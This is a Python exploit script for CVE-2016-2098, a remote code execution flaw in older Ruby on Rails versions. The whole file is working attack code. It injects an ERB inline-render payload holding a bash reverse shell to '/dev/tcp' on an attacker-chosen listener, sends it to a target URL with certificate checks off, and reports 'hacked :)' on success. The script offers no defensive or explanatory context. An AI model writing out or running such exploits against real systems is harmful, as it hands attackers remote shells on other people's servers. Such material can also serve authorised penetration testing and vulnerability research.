import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2016-2098
# Ruby on Rails <= 3.2.22.2, 4.x <= 4.1.14.2, and 4.2.x <= 4.2.5.2
# unauthenticated RCE
class CVE2016_2098:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, path, host, port):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url, self.path = url.rstrip("/"), path.strip("/")
        self.host, self.port = host, port
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        cmd = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.host, self.port)
        payload = "[inline]=" + "<%25=" + "%25x" + "('" + cmd + "')" + "%25>"
        url = self.url + '/' + self.path + payload
        print (LogColors.YELLOW + url + LogColors.ENDC)
        r = self.session.get(url, verify = False)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-p','--path', required = True, help = "uri path")
    parser.add_argument('-I','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-P','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url, path = args['url'], args['path']
    ip, port = args['ip'], args['port']
    cve = CVE2016_2098(url, path, ip, port)
    cve.exploit()

